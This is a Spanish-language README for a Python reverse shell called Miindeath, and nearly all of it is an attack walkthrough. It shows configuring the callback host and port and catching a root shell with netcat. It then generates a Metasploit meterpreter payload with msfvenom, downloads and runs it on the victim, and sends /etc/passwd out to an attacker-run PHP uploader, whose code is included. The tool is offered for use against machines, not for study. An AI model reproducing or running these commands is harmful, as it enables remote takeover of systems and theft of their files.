## Miindeath

\- Miindeath (Siglas de MInImalist Death). Es una shell inversa escrita en Python ( 3 ). que trata de ser lo más simple posible para lograr comprometer una máquina.

## Instalación

**No requiere librerías externas**

```bash
git clone https://github.com/DtxdF/Miindeath.git
cd Miindeath
```

## Modo de ejecución

```bash
editor miindeath.py # Nos vamos a las lineas 54-77 y configuramos a nuestro gusto
```

### Ejemplo:

```
...
class config(object):

    RHOST = '127.0.0.1'
    RPORT = 4444
    LIMIT = 0 # 0 Es infinito
    #timeout = 180 # 3 minutos
    # Los bufers de red
    RECV = 1024
    SEND = 1024
    HEADERS = {
            
        'User-Agent':'Hi!, My Name is DtxdF :)'
            
    }
    
    # Claves de los valores POST
    FILENAME = 'filename' # El nombre del archivo
    FILECONTENT = 'filecontent' # El contenido del archivo

    UNIT_SEP = '.AND.' # Cómo si fuera "bash" o una shell 
                       # cualquiera, para ejecutar varios 
                       # comandos internos.
    SLEEP = 15
    RECONNECT = True # Reconectar sí hay una desconexión, doh.
...
```

Es fácil deducir qué es cada cosa, pero para simplificar la explicación, sólo cambiemos "*RHOST*" y "*RPORT*" a los valores correspondientes.

### Atacando:

```bash
# Victima:
$ ./miindeath # (En caso que se haya compilado a un ejecutable) o python3 miindeath.py
...
# Atacante:
$ nc -lvvp 4444
listening on [any] 4444 ...
connect to [127.0.0.1] from localhost [127.0.0.1] 32974
(5857): root@10.124.185.221:/home/dtxdf/tmp$ shell whoami
root
...
```

### Subiendo y Descargando archivos:

El atacante tiene que tener listo un servidor cualquiera para subir y bajar archivos.

En el caso de la bajada de archivos:

```python
python3 -m http.server 8080
Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
```

*También podria usar Apache (o **cualquier otro**), pero para hacer una simple demostración ...*

Para ser más malévolos, usemos Metasploit O:) ...

```bash
msfvenom -p python/meterpreter/reverse_tcp LHOST=localhost LPORT=4445 -o script.py
No platform was selected, choosing Msf::Module::Platform::Python from the payload
No Arch selected, selecting Arch: python from the payload
No encoder or badchars specified, outputting raw payload
Payload size: 446 bytes
Saved as: script.py
```

En el caso de la subida:

Creamos un simple *uploader* en PHP (**uploader.php**) y lo subimos a nuestro servidor con PHP **instalado** (Aunque podriamos hacer "**php -S 0.0.0.0:8081**").

```php
<?php

	if (isset($_POST['filename'])&&isset($_POST['filecontent'])) {

		fwrite(fopen(basename($_POST['filename']), 'wb'), $_POST['filecontent']);
	
	}

?>
```

*En la configuración pueden cambiar los nombres de los parámetros **POST***

Ahora en la shell para descargar:

```bash
(5857): root@10.124.185.221:/home/dtxdf/tmp$ download http://localhost:8080/script.py /tmp/payload.py
Guardado => /tmp/payload.py
```
Ahora sólo lo ejecutamos y tenemos una mejor shell con poderes.

Y por último, para subir:

```bash
(5857): root@10.124.185.221:/home/dtxdf/tmp$ upload http://localhost:8081/uploader.php /etc/passwd
/etc/passwd, fue subido correctamente
```

**:)**

## Notas:

Aunque sea una simple conexión entre sockets (TCP), la subida y bajada de archivos usa HTTP, simplemente porque es más sencillo para un atacante descargar/subir archivos de cualquier servidor público :)

~ **DtxdF**
